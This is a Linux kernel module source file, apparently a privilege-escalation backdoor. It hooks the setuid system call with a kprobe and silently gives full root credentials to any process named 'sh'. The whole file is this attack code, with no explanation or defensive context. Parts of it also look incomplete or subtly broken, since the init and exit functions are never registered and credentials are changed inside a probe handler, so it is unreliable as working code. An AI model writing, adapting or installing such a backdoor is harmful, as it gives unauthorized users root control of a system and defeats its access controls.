#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/kprobes.h>
#include <linux/cred.h>
#include <linux/sched.h>

static struct kprobe kp = { .symbol_name = "__x64_sys_setuid" };

void privesc_init(void);
void privesc_exit(void);

static int handler_pre(struct kprobe *p, struct pt_regs *regs) {
    struct task_struct *task = current;

    if (strcmp(task->comm, "sh") == 0) {
        struct cred *root = prepare_creds();
        if (!root) {
            return 0;
        }

        root->uid.val = 0;
        root->gid.val = 0;
        root->euid.val = 0;
        root->egid.val = 0;
        root->suid.val = 0;
        root->sgid.val = 0;
        root->fsuid.val = 0;
        root->fsgid.val = 0;

        commit_creds(root);
    }

    return 0;
}

void privesc_init(void) {
    int ret;

    kp.pre_handler = handler_pre;
    ret = register_kprobe(&kp);
    if (ret < 0) {
        return;
    }

}

void privesc_exit(void) {
    unregister_kprobe(&kp);
}